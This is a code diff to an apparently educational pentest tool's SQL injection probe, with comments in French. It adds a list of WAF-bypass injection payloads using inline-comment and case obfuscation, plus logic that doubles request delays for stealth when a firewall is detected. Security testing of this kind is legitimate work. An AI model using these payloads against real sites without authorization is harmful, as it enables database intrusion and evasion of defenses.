@@ -5,10 +5,13 @@ from __future__ import annotations
 import re
 import time
 
+from typing import Optional
+
 from learnwhitehack.core.config import AppConfig
 from learnwhitehack.core.http_client import make_session
 from learnwhitehack.core.logger import get_logger
 from learnwhitehack.core.reporter import Report, Severity
+from learnwhitehack.core.state import ScanContext, Vulnerability as CtxVuln
 
 log = get_logger("vuln.sqli_probe")
 
@@ -57,12 +60,24 @@ _RE_ERRORS = re.compile("|".join(_ERROR_PATTERNS), re.IGNORECASE)
 _DEFAULT_PARAMS = ["id", "page", "p", "q", "s", "search", "cat", "category",
                    "tag", "post", "article", "item", "product", "user", "name"]
 
+# Payloads WAF-bypass : obfuscation par commentaires inline et variation de casse
+_PAYLOADS_WAF_BYPASS = [
+    "'/*!50000OR*/1=1--",
+    "'/**/OR/**/1=1--",
+    "' OR 'x'='x",
+    "1'/**/UNION/**/SELECT/**/NULL--",
+    "1' AnD sLeEp(0)--",
+    "1' /*!AND*/ '1'='1",
+    "1 /*!50000UNION*/ /*!50000SELECT*/ NULL--",
+]
+
 
 def run(
     cfg: AppConfig,
     report: Report,
     urls: list[str] | None = None,
     params: list[str] | None = None,
+    context: Optional[ScanContext] = None,
 ) -> list[dict[str, object]]:
     """Teste les paramètres GET de la cible pour des injections SQL."""
     base_url = cfg.target.url.rstrip("/")
@@ -73,14 +88,26 @@ def run(
     target_params = params or _DEFAULT_PARAMS
     test_urls = urls or [base_url + "/", base_url + "/?s=test"]
 
+    # Synergy WAF → SQLi : adapter les payloads et le délai si un WAF est connu
+    waf_active = context is not None and context.waf_detected is not None
+    active_payloads = _PAYLOADS_WAF_BYPASS if waf_active else _PAYLOADS
+    min_d = cfg.stealth.min_delay * 2 if waf_active else cfg.stealth.min_delay
+    max_d = cfg.stealth.max_delay * 2 if waf_active else cfg.stealth.max_delay
+
+    if waf_active:
+        log.info(
+            f"  [yellow]WAF détecté ({context.waf_detected})[/] "  # type: ignore[union-attr]
+            "→ délai x2, payloads WAF-bypass activés"
+        )
+
     log.info(
         f"[bold]vuln.sqli_probe[/] → {base_url} "
-        f"({len(target_params)} paramètres, {len(_PAYLOADS)} payloads)"
+        f"({len(target_params)} paramètres, {len(active_payloads)} payloads)"
     )
 
     session = make_session(
-        min_delay=cfg.stealth.min_delay,
-        max_delay=cfg.stealth.max_delay,
+        min_delay=min_d,
+        max_delay=max_d,
         proxies=cfg.stealth.proxies,
         verify_ssl=cfg.http.verify_ssl,
     )
@@ -90,7 +117,7 @@ def run(
 
     for base in test_urls:
         for param in target_params:
-            for payload in _PAYLOADS:
+            for payload in active_payloads:
                 url = f"{base}{'&' if '?' in base else '?'}{param}={payload}"
                 key = f"{param}:{payload[:20]}"
                 if key in tested:
@@ -112,6 +139,14 @@ def run(
                         "evidence": resp.text[:300],
                     }
                     vulnerabilities.append(vuln)
+
+                    if context is not None:
+                        context.vulnerabilities.append(CtxVuln(
+                            module_source="vuln.sqli_probe",
+                            severity="CRITICAL",
+                            description=f"SQLi error-based : paramètre '{param}'",
+                            payload_used=payload,
+                        ))
 
                     report.add_finding(
                         module="vuln.sqli_probe",
